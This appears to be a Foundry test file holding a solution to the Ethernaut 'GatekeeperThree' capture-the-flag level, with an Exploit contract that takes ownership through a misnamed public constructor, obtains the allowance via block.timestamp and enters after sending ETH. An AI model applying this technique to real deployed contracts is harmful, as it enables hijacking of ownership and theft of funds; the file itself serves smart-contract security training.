// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {GatekeeperThree} from "../../src/28/GatekeeperThree.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {GatekeeperThreeFactory} from "src/28/GatekeeperThreeFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract GatekeeperThreeTest is Test, BaseTest {
    GatekeeperThree public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new GatekeeperThreeFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = GatekeeperThree(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        Exploit exploit = new Exploit(instanceContract);

        // Send ETH to allow first condition of gateThree to pass
        (bool success,) = instance.call{value: 0.0015 ether}("");
        require(success);
        // Call construct0r to set up owner as the exploit and create a trick
        // Call getAllowance to set up allowEntrance = true
        // call enter from the exploit to allow msg.sender to be the exploit. Now both gateOne and gateTwo are passing. payable(owner).send(0.001 ether)  will return false since exploit does not have a fallback/receive. All modifiers are now passing.
        exploit.setAllThreeGatesAndEnter();

        // DONE !

        vm.stopPrank();
    }
}

contract Exploit {
    GatekeeperThree instanceContract;

    constructor(GatekeeperThree _instanceContract){
        instanceContract = _instanceContract;
    }

    function setAllThreeGatesAndEnter() external {
        instanceContract.construct0r();
        instanceContract.createTrick();
        instanceContract.getAllowance(block.timestamp);
        instanceContract.enter();
    }
}

